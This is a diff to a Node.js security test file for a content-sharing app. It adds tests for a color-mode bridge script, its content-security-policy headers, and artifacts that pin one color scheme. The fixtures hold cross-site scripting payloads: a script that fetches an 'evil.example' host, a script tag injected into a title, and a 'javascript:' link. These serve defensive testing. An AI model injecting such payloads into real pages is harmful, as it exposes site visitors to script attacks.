@@ -8,7 +8,7 @@ import { test, before, after } from 'node:test'
 
 const port = 3620 + Math.floor(Math.random() * 100)
 const base = `http://127.0.0.1:${port}`
-let child, dataDir, cookie, htmlArtifact, markdownArtifact
+let child, dataDir, cookie, htmlArtifact, markdownArtifact, pinnedArtifact
 
 before(async () => {
   dataDir = await mkdtemp(join(tmpdir(), 'serangkai-security-test-'))
@@ -18,6 +18,7 @@ before(async () => {
   cookie = registered.headers.get('set-cookie')
   htmlArtifact = (await (await fetch(`${base}/api/artifacts`, { method: 'POST', headers: { cookie, 'content-type': 'application/json' }, body: JSON.stringify({ title: 'Unsafe HTML', type: 'html', content: '<script>fetch(\"https://evil.example\")</script>', visibility: 'public' }) })).json()).artifact
   markdownArtifact = (await (await fetch(`${base}/api/artifacts`, { method: 'POST', headers: { cookie, 'content-type': 'application/json' }, body: JSON.stringify({ title: '</title><script>alert(1)</script>', type: 'markdown', content: '[bad](javascript:alert(1))', visibility: 'public' }) })).json()).artifact
+  pinnedArtifact = (await (await fetch(`${base}/api/artifacts`, { method: 'POST', headers: { cookie, 'content-type': 'application/json' }, body: JSON.stringify({ title: 'Pinned light', type: 'html', content: '<!DOCTYPE html><html><head><meta name="color-scheme" content="only light"></head><body>pinned</body></html>', visibility: 'public' }) })).json()).artifact
 })
 
 after(async () => { child?.kill('SIGTERM'); await rm(dataDir, { recursive: true, force: true }) })
@@ -49,4 +50,35 @@ test('Markdown output strips executable links and escapes document metadata', as
   assert.doesNotMatch(body, /<script>alert\(1\)<\/script>/)
   assert.doesNotMatch(body, /javascript:/)
   assert.match(body, /&lt;\/title&gt;/)
+})
+
+test('HTML artifacts get a color-mode bridge that follows the client hint', async () => {
+  const adaptive = await fetch(`${base}/api/share/${htmlArtifact.slug}`)
+  const body = await adaptive.text()
+  assert.match(body, /data-serangkai-color-mode/)
+  assert.match(body, /serangkai:color-mode/)
+  assert.match(body, /prefers-color-scheme: dark/)
+
+  const csp = adaptive.headers.get('content-security-policy')
+  assert.match(csp, /script-src 'unsafe-inline'/, 'the bridge script must be allowed')
+  assert.match(csp, /sandbox allow-scripts/)
+  assert.match(csp, /style-src 'unsafe-inline'/)
+  assert.doesNotMatch(csp, /allow-same-origin/)
+  assert.doesNotMatch(csp, /allow-forms/)
+  assert.equal(adaptive.headers.get('accept-ch'), 'Sec-CH-Prefers-Color-Scheme')
+  assert.match(adaptive.headers.get('vary') || '', /Sec-CH-Prefers-Color-Scheme/)
+
+  // The client hint bakes the mode into the first paint.
+  const dark = await fetch(`${base}/api/share/${htmlArtifact.slug}`, { headers: { 'sec-ch-prefers-color-scheme': 'dark' } })
+  assert.match(await dark.text(), /html\{\s*color-scheme:dark;\s*\}/)
+  const light = await fetch(`${base}/api/share/${htmlArtifact.slug}`, { headers: { 'sec-ch-prefers-color-scheme': 'light' } })
+  assert.match(await light.text(), /html\{\s*color-scheme:light;\s*\}/)
+})
+
+test('an artifact that pins one color scheme is delivered untouched', async () => {
+  const response = await fetch(`${base}/api/share/${pinnedArtifact.slug}`, { headers: { 'sec-ch-prefers-color-scheme': 'dark' } })
+  const body = await response.text()
+  assert.equal(response.status, 200)
+  assert.doesNotMatch(body, /data-serangkai-color-mode/, 'pinned artifacts opt out of the bridge')
+  assert.match(body, /only light/)
 })
